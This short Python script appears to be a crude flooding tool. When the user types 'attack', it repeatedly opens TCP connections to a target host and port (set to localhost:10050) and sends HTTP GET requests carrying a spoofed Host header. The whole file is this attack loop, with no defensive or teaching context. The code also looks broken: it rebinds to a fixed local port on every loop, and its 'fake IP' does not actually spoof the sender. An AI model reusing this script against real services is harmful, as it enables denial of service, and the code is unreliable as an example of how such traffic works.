import socket
import time
port = 10050
target = "localhost"
i = 1
fake_ip = '182.21.20.32'


def attack():
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("localhost", 4444))
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            time.sleep(0.4)


while True:
    command = input()
    if command == "attack":
        attack()
